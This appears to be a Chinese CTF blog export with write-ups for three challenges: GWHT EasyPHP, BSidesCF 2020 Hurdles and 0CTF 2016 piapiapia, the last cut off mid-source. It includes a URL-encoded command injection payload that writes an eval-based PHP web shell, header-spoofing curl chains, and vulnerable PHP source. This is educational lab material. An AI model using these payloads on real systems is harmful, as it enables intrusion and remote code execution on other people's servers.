class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;printf \&#x27;&#x27;</span> . <span class="variable">$count</span> . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>存在 <code>robots.txt</code> 回显 <code>Disallow: /?file=check.php</code></p>
<p>获得 <code>check.php</code> 源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p>抓包修改 cookie pass</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100809698.jpg" data-fancybox="group" data-caption="Easyphp_2" class="fancybox"><img alt="Easyphp_2" title="Easyphp_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100809698.jpg" class="lazyload"></a></p>
<p>然后根据之前获得的 <code>GWHT.php</code> 源码分析，<code>count</code> 存在过滤 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))</span><br></pre></td></tr></table></figure></div>

<p>但是仍然可以通过URL编码过滤，通过构造shell，进行蚁剑连接</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;|echo &quot;&lt;?= eval(\$_POST[&#x27;</span>yakko<span class="string">&#x27;])?&gt;&quot; &gt; test.php&#x27;</span></span><br><span class="line"><span class="string">&#x27;|echo &quot;&lt;?= exec(&quot;env&quot;);?&gt;&quot; &gt; test123.php&#x27;</span></span><br><span class="line"></span><br><span class="line">%<span class="number">27</span>%<span class="number">7</span>Cecho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">eval</span>(%<span class="number">5</span>C%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">27</span>yakko%<span class="number">27</span>%<span class="number">5</span>D)%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>test.php%<span class="number">27</span></span><br><span class="line"></span><br><span class="line">%<span class="number">27</span>%<span class="number">7</span>Cecho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>D%<span class="number">20</span>exec(%<span class="number">22</span>env%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>test123.php%<span class="number">27</span></span><br><span class="line"></span><br><span class="line">GET /?file=GWHT.php&amp;count=%<span class="number">27</span>%<span class="number">7</span>Cecho%<span class="number">20</span>%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>D%<span class="number">20</span><span class="keyword">eval</span>(%<span class="number">5</span>C%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">27</span>yakko%<span class="number">27</span>%<span class="number">5</span>D)%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">20</span>test.php%<span class="number">27</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100830729.jpg" data-fancybox="group" data-caption="Easyphp_3" class="fancybox"><img alt="Easyphp_3" title="Easyphp_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100830729.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">txt</div></div><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">My password hash is 877862561ba0162ce610dd8bf90868ad414f0ec6.</span><br></pre></td></tr></table></figure></div>

<p>命令行一直操作不了之后，想起了可以直接在蚁剑新建webshell，属于是纯纯铸币了 &#x3D; &#x3D;</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100942426.jpg" data-fancybox="group" data-caption="Easyphp_4" class="fancybox"><img alt="Easyphp_4" title="Easyphp_4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100942426.jpg" class="lazyload"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100943953.jpg" data-fancybox="group" data-caption="Easyphp_5" class="fancybox"><img alt="Easyphp_5" title="Easyphp_5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100943953.jpg" class="lazyload"></a></p>
<hr>
<h1 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h1><p>You’ll be rewarded with a flag if you can make it over some &#x2F;hurdles.</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://target.site/hurdles</span><br><span class="line"></span><br><span class="line"><span class="comment"># respond:</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting the PUT Method.</span></span><br></pre></td></tr></table></figure></div>

<p>改请求包为 <code>PUT</code> 说明可以用 <code>curl</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT http://target.site/hurdles</span><br><span class="line"><span class="comment"># I&#x27;m sorry, Your path would be more exciting if it ended in !</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT http://target.site/hurdles!</span><br><span class="line"><span class="comment"># You&#x27;ll be rewarded with a flag if you can make it over some /hurdles.</span></span><br><span class="line"></span><br><span class="line">curl -X PUT http://target.site/hurdles/!</span><br><span class="line"><span class="comment"># I&#x27;m sorry, Your URL did not ask to `get` the `flag` in its query string.</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I expected &#x27;&amp;=&amp;=&amp;&#x27; to equal &#x27;%00</span></span><br></pre></td></tr></table></figure></div>

<p>需要将 <code>&amp;=&amp;=&amp;</code> 的值等于 <code>%00</code>（换行符），其后还包含了一个换行符，也是进行URL编码：<code>%2500%0a</code><br><code>%2500</code> &#x3D;&#x3D; <code>%00</code> &amp;&amp;  <code>%0a</code> &#x3D;&#x3D; <code>linefeed</code> (换行)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, Basically, I was expecting the username player.</span></span><br><span class="line"></span><br><span class="line">curl  -u, --user &lt;user:password&gt; Server user and password</span><br></pre></td></tr></table></figure></div>

<p>随便尝试一下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:player&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string &#x27;open sesame&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>提示密码为 <code>open sesame</code> 的md5加密值 <code>54ef36ec71201fdf9d1423fd26f97f6b</code> (还必须32位 就很过分)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting you to be using a 1337 Browser.</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -A, --user-agent &lt;name&gt;    Send User-Agent &lt;name&gt; to server</span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting your browser version (v.XXXX) to be over 9000!</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was eXpecting this to be Forwarded-For someone!</span></span><br></pre></td></tr></table></figure></div>

<p>继续加 <code>XFF</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was eXpecting this to be Forwarded For someone through another proxy!</span></span><br><span class="line"><span class="comment"># 还要代理转发</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:4.4.4.4,127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting the forwarding client to be 13.37.13.37</span></span><br><span class="line"></span><br><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting a Fortune Cookie</span></span><br></pre></td></tr></table></figure></div>
<p>别太过分了！</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=1&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.</span></span><br></pre></td></tr></table></figure></div>

<p>需要 <code>Cookie</code> 中来自 <code>State Management Mechanism</code> <code>2011年</code> 的 <code>RFC编号</code><br><a href="https://datatracker.ietf.org/doc/search">找到这个网站</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151223669.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151223669.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I expect you to accept only plain text media (MIME) type.</span></span><br></pre></td></tr></table></figure></div>

<p>只接受<code>纯文本（MIME）</code>形式的请求，依然通过 <code>-H</code> 参数添加请求头信息<code>Accept:text/plain</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span> -H <span class="string">&quot;Accept:text/plain&quot;</span></span><br><span class="line"><span class="comment"># I&#x27;m sorry, Я ожидал, что вы говорите по-русски.</span></span><br></pre></td></tr></table></figure></div>
<p>????<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151227744.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303151227744.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span> -H <span class="string">&quot;Accept:text/plain&quot;</span> -H <span class="string">&quot;Accept-Language:ru&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I&#x27;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</span></span><br></pre></td></tr></table></figure></div>

<p>添加 <code>origin:https://ctf.bsidessf.net</code> 和 <code>Referer:https://ctf.bsidessf.net/challenges</code></p>
<p>回显 <code>Congratulations!</code></p>
<p>最终 <code>payload</code> </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT <span class="string">&quot;http://target.site/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&quot;</span> -u <span class="string">&quot;player:54ef36ec71201fdf9d1423fd26f97f6b&quot;</span> -A <span class="string">&quot;1337 Browser v.9999&quot;</span> -H <span class="string">&quot;X-Forwarded-For:13.37.13.37,127.0.0.1&quot;</span> -b <span class="string">&quot;Fortune=6265&quot;</span> -H <span class="string">&quot;Accept:text/plain&quot;</span> -H <span class="string">&quot;Accept-Language:ru&quot;</span> -H <span class="string">&quot;origin:https://ctf.bsidessf.net&quot;</span> -H <span class="string">&quot;Referer:https://ctf.bsidessf.net/challenges&quot;</span></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Ctf-Flag: flag&#123;5cb35f50-2c2f-4a9a-9001-10cd968b0347&#125;</span><br><span class="line">Date: Wed, 15 Mar 2023 04:33:29 GMT</span><br><span class="line">Content-Length: 16</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay5</title>
    <url>/yakko117/2019/12/02/BuuctfDay5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BuuctfDay5"><a href="#BuuctfDay5" class="headerlink" title="BuuctfDay5"></a>BuuctfDay5</h1><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="考点：php反序列化长度变化尾部字符串逃逸"><a href="#考点：php反序列化长度变化尾部字符串逃逸" class="headerlink" title="考点：php反序列化长度变化尾部字符串逃逸"></a>考点：php反序列化长度变化尾部字符串逃逸</h3><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96777110">大佬的wp</a><br>点击进入一个登陆页面，扫后台，扫到了 <code>www.zip</code> ，然后注册账号</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxgl0yj307w0clq41.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxgl0yj307w0clq41.jpg" class="lazyload"></a></p>
<h3 id="跳转到-Profile-php"><a href="#跳转到-Profile-php" class="headerlink" title="跳转到 Profile.php"></a>跳转到 Profile.php</h3><h2 id="这边只展示部分源码-以及核心的-class-php"><a href="#这边只展示部分源码-以及核心的-class-php" class="headerlink" title="这边只展示部分源码### 以及核心的 class.php"></a>这边只展示部分源码<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">        <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">        &lt;<span class="title">img</span> <span class="title">src</span> = <span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure></div><br>### 以及核心的 class.php<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">        <span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span 